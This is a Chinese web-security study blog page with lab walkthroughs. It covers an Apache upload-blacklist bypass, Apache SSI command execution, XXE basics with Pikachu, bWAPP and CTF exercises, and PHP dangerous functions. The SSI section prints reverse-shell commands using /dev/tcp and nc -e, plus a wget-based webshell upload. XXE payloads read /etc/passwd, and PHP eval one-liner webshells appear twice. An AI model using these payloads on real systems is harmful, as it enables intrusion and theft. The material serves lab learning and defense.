+<p><img src="https://pic2.zhimg.com/80/v2-844c604155e2bbdbfcdb51501261eb8d_720w.jpg" alt="img"></p>
+<p>改完后将数据包给服务器，此时在浏览器中访问<a href="https://link.zhihu.com/?target=http%3A//IP%3A8080/phpinfo.php%0a">http://IP:8080/phpinfo.php%0a</a>便可以看到phpinfo的界面，说明利用成功。</p>
+<p><strong>在Windows下的表现</strong><br>将漏洞代码复制到windows的环境中，进行访问、抓包（和文章中在Linux的方法一样），最终会出现以下问题：</p>
+<p><img src="https://pic3.zhimg.com/80/v2-c5db07449b76d9786d7e0fc0a8daaca2_720w.png" alt="img"></p>
+<p>根据上图可以发现，move_uploaded_file函数已经被执行了，说明我们绕过了黑名单的检测，只不过在windows创建文件的时候由于结尾是换行符，windows不允许，所以创建失败了。</p>
+<p><strong>index.php源码</strong></p>
+<pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
+<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+    <span class="token variable">$name</span> <span class="token operator">=</span> <span class="token function">basename</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token keyword">echo</span> <span class="token variable">$name</span><span class="token punctuation">;</span>
+    <span class="token variable">$ext</span> <span class="token operator">=</span> <span class="token function">pathinfo</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token punctuation">,</span><span class="token constant">PATHINFO_EXTENSION</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$ext</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token string">'php'</span><span class="token punctuation">,</span> <span class="token string">'php3'</span><span class="token punctuation">,</span> <span class="token string">'php4'</span><span class="token punctuation">,</span> <span class="token string">'php5'</span><span class="token punctuation">,</span> <span class="token string">'phtml'</span><span class="token punctuation">,</span> <span class="token string">'pht'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+        <span class="token function">exit</span><span class="token punctuation">(</span><span class="token string">'bad file'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">}</span>
+    <span class="token function">move_uploaded_file</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'tmp_name'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token string">'./'</span> <span class="token punctuation">.</span> <span class="token variable">$name</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span>
+<span class="token delimiter">?></span>
+<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">action</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>index.php<span class="token punctuation">"</span></span> <span class="token attr-name">method</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>post<span class="token punctuation">"</span></span> <span class="token attr-name">enctype</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>multipart/form-data<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span>
+    <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>file<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>file<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span>
+    <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>text<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>name<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span>
+    <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>submit<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>submit<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span>
+<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">></span></span></span></code></pre>
+<h3 id="Apache-SSI远程命令执行漏洞"><a href="#Apache-SSI远程命令执行漏洞" class="headerlink" title="Apache SSI远程命令执行漏洞"></a>Apache SSI远程命令执行漏洞</h3><p>参考：<a href="https://github.com/zhangzhenfeng/vulhub/tree/master/httpd/ssi-rce" target="_blank" rel="noopener">https://github.com/zhangzhenfeng/vulhub/tree/master/httpd/ssi-rce</a></p>
+<p><strong>影响版本</strong>：Apache全版本（支持SSI与CGI）</p>
+<p><strong>影响说明</strong>：绕过服务器策略，上传webshell</p>
+<p><strong>环境说明</strong>：PHP7.1 、 Apache2.4.25</p>
+<p><strong>环境搭建</strong>：<br>此次环境使用docker环境搭建，环境采用地址<a href="https://link.zhihu.com/?target=https%3A//github.com/zhangzhenfeng/vulhub/tree/master/httpd/ssi-rce">Vulhub</a>，环境文件有2个</p>
+<ul>
+<li>docker-compose.yml</li>
+<li>upload.php</li>
+</ul>
+<p>执行构建环境命令如下（启动后在浏览器中访问<a href="https://link.zhihu.com/?target=http%3A//127.0.0.1%3A8080">http://127.0.0.1:8080</a>）</p>
+<pre class=" language-text"><code class="language-text">docker-compose build
+docker-compose up -d</code></pre>
+<p><strong>漏洞原理</strong><br>SSI（server-side includes）:是放置在HTML页面中的指令，它可以将动态生成的内容添加到现有的HTML页面，而不必通过CGI程序或其他动态技术来提供整个页面。以上是定义采用在Apache官网对<a href="https://link.zhihu.com/?target=https%3A//httpd.apache.org/docs/2.4/howto/ssi.html">SSI的定义</a>，说白了就是可以在HTML中加入特定的指令，也可以引入其他的页面。开启SSI需要单独配置Apache，可以参考<a href="https://link.zhihu.com/?target=https%3A//httpd.apache.org/docs/2.4/howto/ssi.html">SSI配置</a>。<br>SSI可以完成查看时间、文件修改时间、CGI程序执行结果、执行系统命令、连接数据库等操作，功能非常强大。<br>我们要利用的就是SSI执行系统命令的功能，正常的一个包含SSI指令的文件，可以如下内容：</p>
+<pre class=" language-php"><code class="language-php"><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>pre</span><span class="token punctuation">></span></span></span>
+<span class="token markup"><span class="token comment" spellcheck="true">&lt;!--#exec cmd="whoami" --></span></span>
+<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>pre</span><span class="token punctuation">></span></span></span></code></pre>
+<p>文件名保存为test.shtml，这个后缀取决于Apache的配置，默认是此后缀。<br>当后台对扩展名校验不严格时，可以上传此类型文件，达到执行命令，获取webshell的目的。执行效果：</p>
+<p><img src="https://pic1.zhimg.com/80/v2-ebadded85bd12ddb13481a3cf4d86d80_720w.jpg" alt="img"></p>
+<p>上传webshell：</p>
+<pre class=" language-text"><code class="language-text"><!--#exec cmd="wget http://xxx/shell.txt | rename shell.txt shell.php" -->
+echo '<?php @eval($_POST[margin]);?>' > shell.php</code></pre>
+<p>反弹shell：</p>
+<pre class=" language-text"><code class="language-text"><!--#exec cmd="/bin/bash -i > /dev/tcp/192.168.0.118/8888 0<&1 2>&1" -->
+<!--#exec cmd="nc x.x.x.x 8888 -e /bin/bash"--></code></pre>
+<h5 id="漏洞复现：-1"><a href="#漏洞复现：-1" class="headerlink" title="漏洞复现："></a>漏洞复现：</h5><p>正常上传PHP文件是不允许的，我们可以上传一个shell.shtml文件：</p>
+<p><a href="https://github.com/zhangzhenfeng/vulhub/blob/master/httpd/ssi-rce/1.png" target="_blank" rel="noopener"><img src="https://github.com/zhangzhenfeng/vulhub/raw/master/httpd/ssi-rce/1.png" alt="img"></a></p>
+<p>成功上传，然后访问shell.shtml，可见命令已成功执行：</p>
+<p><a href="https://github.com/zhangzhenfeng/vulhub/blob/master/httpd/ssi-rce/2.png" target="_blank" rel="noopener"><img src="https://github.com/zhangzhenfeng/vulhub/raw/master/httpd/ssi-rce/2.png" alt="img"></a></p>
+<p><strong>参考文章：</strong><a href="https://zhuanlan.zhihu.com/p/125115734" target="_blank" rel="noopener">https://zhuanlan.zhihu.com/p/125115734</a></p>
+
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="https://shu1l.github.io/2020/04/02/xxe-lou-dong-xue-xi/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Shu1L">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Hexo">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2020/04/02/xxe-lou-dong-xue-xi/" itemprop="url">XXE漏洞学习</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-04-02T23:29:05+08:00">
+                2020-04-02
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/web%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/" itemprop="url" rel="index">
+                    <span itemprop="name">web漏洞学习</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <h2 id="XXE漏洞学习笔记-靶场实战"><a href="#XXE漏洞学习笔记-靶场实战" class="headerlink" title="XXE漏洞学习笔记+靶场实战"></a>XXE漏洞学习笔记+靶场实战</h2><p>[TOC]</p>
+<h4 id="一、关于XML和XXE的基础知识"><a href="#一、关于XML和XXE的基础知识" class="headerlink" title="一、关于XML和XXE的基础知识"></a>一、关于XML和XXE的基础知识</h4><p>​     XXE全称XML,也就是XML外部实体注入攻击，是对非安全的外部实体数据进行处理时引发的安全问题。要想搞懂XXE，一定要先了解XML语法规则和外部实体的定义及调用形式。</p>
+<h5 id="XML基础知识"><a href="#XML基础知识" class="headerlink" title="XML基础知识"></a>XML基础知识</h5><p>XML用于标记电子文件使其具有结构性的标记语言，可以用来标记数据、定义数据类型，是一种允许用户对自己的标记语言进行定义的源语言。XML文档结构包括XML声明、DTD文档类型定义(可选)、文档元素。XML语法规则：</p>
+<p>1.所有的XML元素都必须有一个关闭标签；</p>
+<p>2.XML标签对大小写敏感。</p>
+<p>3.XML必须正确嵌套。</p>
+<p>4.XML属性值必须加“”。</p>
+<ul>
+<li>XML被设计为传输和存储数据，其焦点是数据的内容。</li>
+<li>HTML被设计用来显示数据，其焦点是数据的外观。</li>
+</ul>
+<p><strong>XML基本文档结构</strong></p>
+<pre class=" language-xml"><code class="language-xml"><span class="token comment" spellcheck="true">&lt;!--XML声明--></span>
+<span class="token prolog">&lt;?xml version="1.0" encoding="UTF-8"?></span>
+<span class="token comment" spellcheck="true">&lt;!--DTD，这部分可选的--></span>          
+<span class="token doctype">&lt;!DOCTYPE foo [ 
+&lt;!ELEMENT foo ANY ></span>
+&lt;!ENTITY xxe SYSTEM "file:///c:/windows/win.ini" >
+]>
+<span class="token comment" spellcheck="true">&lt;!--文档元素--></span>                                                                          
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>foo</span><span class="token punctuation">></span></span><span class="token entity" title="&xxe;">&amp;xxe;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>foo</span><span class="token punctuation">></span></span></code></pre>
+<h5 id="xml元素介绍"><a href="#xml元素介绍" class="headerlink" title="xml元素介绍"></a>xml元素介绍</h5><p>XML元素是指从开始标签直到结束标签的部分。每个元素又有对应的属性，XML属性必须加引号。</p>
+<p>注意：</p>
+<ul>
+<li><p>XML文档必须有一个根元素。</p>
+</li>
+<li><p>XML元素必须有一个关闭标签</p>
+</li>
+<li><p>XML标签对大小写敏感</p>
+</li>
+<li><p>XML元素必须被正确的嵌套。</p>
+</li>
+<li><p>XML属性值必须加引号</p>
+</li>
+</ul>
+<p><img src="QQ%E6%88%AA%E5%9B%BE20200117181423.png" alt=""></p>
+<h5 id="XML-DTD介绍"><a href="#XML-DTD介绍" class="headerlink" title="XML DTD介绍"></a>XML DTD介绍</h5><p>DTD文档类型定义，约束了xml文档的结构。拥有正确语法的XML被称为“形式良好”的XML，通过DTD验证约束XML是“合法”的XML。</p>
+<img src="QQ截图20200117183256.png" style="zoom: 67%;" />
+
+<h5 id="DTD含义"><a href="#DTD含义" class="headerlink" title="DTD含义"></a>DTD含义</h5><p>XML文档有自己的一个格式规范，这个格式规范是由一个叫做DTD文档类型定义的东西控制的。</p>
+<p>DTD用来描述xml文档的结构，一个DTD文档包含：</p>
+<ul>
+<li>元素的定义规则</li>
+<li>元素之间的关系规则</li>
+<li>属性的定义规则</li>
+</ul>
+<p>DTD可被成行地声明于xml文档中，也可作为一个外部引用。</p>
+<h5 id="内部的DOCTYPE声明"><a href="#内部的DOCTYPE声明" class="headerlink" title="内部的DOCTYPE声明"></a>内部的DOCTYPE声明</h5><p>内部声明DTD类型声明：<!DOCTYPE 根元素 [子元素声明]></p>
+<img src="QQ截图20200117195250.png" style="zoom:67%;" />
+
+<h5 id="引用外部实体："><a href="#引用外部实体：" class="headerlink" title="引用外部实体："></a>引用外部实体：</h5><p>我们主要关注XML外部实体的定义和调用方式：</p>
+<!ENTITY 实体名称 SYSTEM "URL"><p> </p>
+<p><strong>实例：</strong></p>
+<pre class=" language-xml"><code class="language-xml"><span class="token prolog">&lt;?xml version="1.0"?></span>
+<span class="token doctype">&lt;!DOCTYPE root-element SYSTEM "test.dtd"></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>note</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>to</span><span class="token punctuation">></span></span>you<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>to</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>from</span><span class="token punctuation">></span></span>are<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>from</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span>very<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span>good!<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>note</span><span class="token punctuation">></span></span></code></pre>
+<p>test.dtd</p>
+<pre class=" language-xml"><code class="language-xml"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>!ELEMENT</span> <span class="token attr-name">to</span> <span class="token attr-name">(#PCDATA)</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>!ELEMNET</span> <span class="token attr-name">from</span> <span class="token attr-name">(#PCDATA</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>!ELEMENT</span> <span class="token attr-name">head</span> <span class="token attr-name">(#PCDATA)</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>!ELEMENT</span> <span class="token attr-name">body</span> <span class="token attr-name">(#PCDATA)</span><span class="token punctuation">></span></span></code></pre>
+<p>- PCDATA的意思是被解析的字符数据。PCDATA是会被解析器解析的文本。这些文本将被解析器检查实体以及标记。文本中的标签会被当作标记来处理，而实体会被展开。</p>
+<h5 id="DTD实体介绍"><a href="#DTD实体介绍" class="headerlink" title="DTD实体介绍"></a>DTD实体介绍</h5><p>实体定义：实体是用于定义引用普通文本或者特殊字符的快捷方式的变量。</p>
+<p>在DTD中的实体类型，一般分为：内部实体和外部实体，细分又分为一般实体和参数实体。除外部参数实体引用以字符（%）开始外，其他参数实体都以字符(&amp;)开始，以字符(;)结束。</p>
+<h5 id="内部实体："><a href="#内部实体：" class="headerlink" title="内部实体："></a>内部实体：</h5><!ENTITY 实体名称 ”实体的值">
+
+<p><img src="QQ%E6%88%AA%E5%9B%BE20200117200803.png" alt=""></p>
+<h5 id="外部实体："><a href="#外部实体：" class="headerlink" title="外部实体："></a>外部实体：</h5><!ENTITY 实体名称 SYSTEM "URl/URL">
+
+<img src="QQ截图20200117201148.png"  />
+
+<h5 id="外部参数实体："><a href="#外部参数实体：" class="headerlink" title="外部参数实体："></a>外部参数实体：</h5><!ENTITY % 实体名 “实体内容">
+
+<p>该类型的实体用“%”字符声明，并且仅在经过解析和验证后才用于替换DTD中的文本或其他内容：</p>
+<p><strong>示例：</strong></p>
+<pre class=" language-xml"><code class="language-xml"><span class="token prolog">&lt;?xml version="1.0" encoding="utf-8" ?></span>
+<span class="token doctype">&lt;!DOCTYPE demo [
+            &lt;!ENTITY % first "Hello"></span>
+            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>!ENTITY</span> <span class="token attr-name">%</span> <span class="token attr-name">second</span> <span class="token attr-name">"&amp;first;_world"</span><span class="token punctuation">></span></span>
+%second;]></code></pre>
+<p>​                                </p>
+<h4 id="XML注入漏洞（XXE漏洞）"><a href="#XML注入漏洞（XXE漏洞）" class="headerlink" title="XML注入漏洞（XXE漏洞）"></a>XML注入漏洞（XXE漏洞）</h4><h5 id="XXE漏洞原理"><a href="#XXE漏洞原理" class="headerlink" title="XXE漏洞原理"></a>XXE漏洞原理</h5><p>XXE漏洞全称XML外部实体注入漏洞，XXE漏洞发生在应用程序解析XML输入时，没有禁止外部实体的加载，导致可加载恶意外部文件，造成文件读取、命令执行、内网端口扫描、攻击内网网站、发起dos攻击等危害。xxe漏洞触发的点往往是可以上传xml文件的位置，没有对上传的xml文件进行过滤，导致可上传恶意xml文件。</p>
+<p>xxe漏洞触发的点往往是可以上传xml文件的位置，没有对上传的XML文件进行过滤，导致可以上传恶意的XML文件。</p>
+<p>通常攻击者会将payload注入XML文件中，一旦文件被执行，将会读取服务器上的本地文件，并对内网发起访问扫描内部网络端口。换而言之，XXE是一种从本地到达各种服务的方法。此外，在一定程度上这也可能帮助攻击者绕过防火墙规则过滤或身份验证检查。</p>
+<h5 id="常见的XXE漏洞类型"><a href="#常见的XXE漏洞类型" class="headerlink" title="常见的XXE漏洞类型"></a>常见的XXE漏洞类型</h5><ul>
+<li><strong>基础的XXE注入</strong>——外部实体注入本地DTD</li>
+<li><strong>基于盲注的XXE注入</strong>——xml解析器在响应中不显示任何错误。、</li>
+<li><strong>基于错误的XXE注入</strong>——成功解析之后，XML解析器始终显示SAME响应。（您的消息已被接收）。因此，我们可能希望解析器将文件的内容“打印”到错误响应中。</li>
+</ul>
+<h5 id="XXE漏洞危害"><a href="#XXE漏洞危害" class="headerlink" title="XXE漏洞危害"></a>XXE漏洞危害</h5><ul>
+<li>任意文件读取</li>
+<li>探测内网地址</li>
+<li>通过DTD窃取文件</li>
+<li>远程代码执行</li>
+</ul>
+<h5 id="XXE漏洞的测试方法"><a href="#XXE漏洞的测试方法" class="headerlink" title="XXE漏洞的测试方法"></a>XXE漏洞的测试方法</h5><p>发现post请求的接口的时候，可以这样试试：</p>
+<pre><code>&lt;?xml version=&quot;1.0&quot;?&gt; 
+&lt;!DOCTYPE a [ 
+&lt;!ENTITY test &quot;THIS IS A STRING!&quot;&gt; 
+]&gt; 
+&lt;methodCall&gt;&lt;methodName&gt;&amp;test;&lt;/methodName&gt;&lt;/methodCall&gt;</code></pre><p>如果发现了一个错误：</p>
+<pre><code>&lt;?xml version=&quot;1.0&quot;?&gt; 
+&lt;!DOCTYPE a 
+[&lt;!ENTITY test &quot;nice string bro&quot;&gt;] 
+&gt;
+&lt;methodCall&gt;&lt;methodName&gt;&amp;test;&lt;/methodName&gt;&lt;/methodCall&gt;</code></pre><p>说明能够解析，试试读文件：</p>
+<pre><code>&lt;?xml version=&quot;1.0&quot;?&gt;
+&lt;!DOCTYPE a 
+[&lt;!ENTITY test SYSTEM &quot;file:///etc/passwd&quot;&gt;] 
+&gt;
+
+&lt;methodCall&gt;&lt;methodName&gt;&amp;test;&lt;/methodName&gt;&lt;/methodCall&gt;</code></pre><p>或者用php伪协议：</p>
+<pre><code>&lt;?xml version=&quot;1.0&quot;?&gt; 
+&lt;!DOCTYPE a 
+[&lt;!ENTITY test SYSTEM &quot;php://filter/convert.base64-encode/resource=index.php&quot;&gt;] 
+&gt;
+&lt;methodCall&gt;&lt;methodName&gt;&amp;test;&lt;/methodName&gt;&lt;/methodCall&gt;</code></pre><p>得到的结国再base64解码即可。</p>
+<h5 id="XXE漏洞的防御"><a href="#XXE漏洞的防御" class="headerlink" title="XXE漏洞的防御"></a>XXE漏洞的防御</h5><p>方案：使用开发语言提供的禁用外部实体的方法。</p>
+<p><strong>1.PHP</strong>：</p>
+<p>libxml_disable_entity_loader(true);</p>
+<p><strong>2.JAVA:</strong></p>
+<p>DocumentBuilderFactory dbf =DocumentBuilderFactory.newInstance();</p>
+<p>dbf.setExpandEntityReferences(false);</p>
+<p><strong>3.Python：</strong></p>
+<p>from lxml import etree</p>
+<p>xmlData = etree.parse(xmlSource,etree.XMLParser(resolve_entities=False))</p>
+<h3 id="靶场实战"><a href="#靶场实战" class="headerlink" title="靶场实战"></a>靶场实战</h3><h4 id="pikachu靶场"><a href="#pikachu靶场" class="headerlink" title="pikachu靶场"></a>pikachu靶场</h4><h5 id="pikachu靶场简介"><a href="#pikachu靶场简介" class="headerlink" title="pikachu靶场简介"></a>pikachu靶场简介</h5><p>​     Pikachu是一个带有漏洞的Web应用系统，在这里包含了常见的web安全漏洞。如果你是一个Web渗透测试学习人员且正发愁没有合适的靶场进行练习，那么Pikachu可能正合你意。</p>
+<h5 id="XXE漏洞利用进行文件读取"><a href="#XXE漏洞利用进行文件读取" class="headerlink" title="XXE漏洞利用进行文件读取"></a>XXE漏洞利用进行文件读取</h5><p>我们首先在本地进入网站，选择XXE模块</p>
+<img src="QQ截图20200123165140.png" style="zoom: 50%;" />
+
+
+
+<p>构造利用payload</p>
+<img src="QQ截图20200123170052.png" style="zoom:67%;" />
+
+<p>将payload填入输入框进行提交</p>
+<img src="QQ截图20200123165827.png" style="zoom:50%;" />
+
+<p>可见我们提交的内容显现在了页面。</p>
+<p>我们在D盘下新建一个1.txt文件，内容为：</p>
+<img src="QQ截图20200123170613.png" style="zoom: 80%;" />
+
+<p>然后构造利用代码：</p>
+<img src="QQ截图20200123171804.png" style="zoom:80%;" />
+
+<p>提交，我们可以成功读取到本地1.txt文件的内容</p>
+<img src="QQ截图20200123170601.png" style="zoom: 67%;" />
+
+
+
+
+
+<h4 id="CTF-jarvisoj-xxe"><a href="#CTF-jarvisoj-xxe" class="headerlink" title="CTF-jarvisoj(xxe)"></a>CTF-jarvisoj(xxe)</h4><p>我们进入题目，发现有一个输出框</p>
+<img src="QQ截图20200202185412.png" style="zoom: 80%;" />
+
+
+
+<p>我们输入任意内容然后进行抓包</p>
+<img src="QQ截图20200202185424.png" style="zoom: 80%;" />
+
+<p>将Content-Type的值改为application/xml，然后提交xml发现能够被解析</p>
+<p>我们构造payload读取目标机器/home/ctf/flag.txt中的flag值。</p>
+<pre><code>&lt;!DOCTYPE foo [
+    &lt;!ENTITY xxe SYSTEM &quot;file:///home/ctf/flag.txt&quot; &gt;
+]&gt;
+&lt;root&gt;
+    &lt;name&gt;&amp;xxe;&lt;/name&gt;
+&lt;/root&gt;</code></pre><img src="QQ截图20200202185528.png" style="zoom:67%;" />
+
+<p>可以看到成功读取。</p>
+<h4 id="BWAPP-（XXE部分）"><a href="#BWAPP-（XXE部分）" class="headerlink" title="BWAPP （XXE部分）"></a>BWAPP （XXE部分）</h4><p>我们先点击黑体字获取XXE攻击脚本。</p>
+<img src="QQ截图20200128170206.png" style="zoom:67%;" />
+
+<p><img src="QQ%E6%88%AA%E5%9B%BE20200128170255.png" alt=""></p>
+<p>然后使用Burp抓包后发送到Repeater模块</p>
+<p><img src="QQ%E6%88%AA%E5%9B%BE20200128171953.png" alt=""></p>
+<p><strong>第一次我们使用http协议读取robots.txt文件内容</strong></p>
+<p><img src="QQ%E6%88%AA%E5%9B%BE20200128175808.png" alt=""></p>
+<p><strong>第二次我们使用php协议读取 xml页面中的内容</strong></p>
+<p><img src="QQ%E6%88%AA%E5%9B%BE20200128175940.png" alt=""></p>
+<p><strong>第三次我们使用file协议读取本机的/etc/passwd的内容</strong></p>
+<img src="QQ截图20200128180043.png" style="zoom:67%;" />
+
+
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="https://shu1l.github.io/2020/04/02/php-wei-xian-han-shu-zong-jie/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Shu1L">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Hexo">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2020/04/02/php-wei-xian-han-shu-zong-jie/" itemprop="url">PHP危险函数总结</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-04-02T23:02:41+08:00">
+                2020-04-02
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <h2 id="php危险函数总结"><a href="#php危险函数总结" class="headerlink" title="php危险函数总结"></a>php危险函数总结</h2><h4 id="什么是危险函数"><a href="#什么是危险函数" class="headerlink" title="什么是危险函数"></a>什么是危险函数</h4><p>​    函数设计出来就是让人使用的，之所以危险，是因为其功能过于强大。开发人员特别是刚从业的人员很少很少会完整阅读整个文档，再或者是没有意识到当给这些函数传递一些非常规的，外部可控的参数会带来什么影响。</p>
+<pre><code>$_GET            
+$POST
+$_fILES
+$_COOKIE
+$_REQUEST        
+$_SERVER        
+$_SESSION    </code></pre><h4 id="执行任意代码的函数"><a href="#执行任意代码的函数" class="headerlink" title="执行任意代码的函数"></a>执行任意代码的函数</h4><ul>
+<li>eval函数</li>
+<li>assert函数</li>
+<li>create_function 函数</li>
+<li>preg_replace 函数</li>
+<li>call_user_func/call_user_func_array函数</li>
+<li>array_map函数</li>
+<li>array_filter函数</li>
+<li>usort/uasort函数</li>
+<li>$a($b)动态函数</li>
+</ul>
+<h5 id="eval函数"><a href="#eval函数" class="headerlink" title="eval函数"></a>eval函数</h5><p>eval() 函数把字符串按照 PHP 代码来计算。</p>
+<p>该字符串必须是合法的 PHP 代码，且必须以分号结尾。</p>
+<p><strong>注释：</strong>return 语句会立即终止对字符串的计算。</p>
+<p><strong>提示：</strong>该函数对于在数据库文本字段中供日后计算而进行的代码存储很有用。</p>
+<pre><code>&lt;?php
+$string = &quot;beautiful&quot;;
+$time = &quot;winter&quot;;
+$str = &#39;This is a $string $time morning!&#39;;
+eval(&quot;\$str = \&quot;$str\&quot;;&quot;);
+echo $str;
+
+输出为：This is a beautiful winter morning! </code></pre><p><strong>简单的一句话木马：</strong><?php eval($_POST['CMD']);?></p>
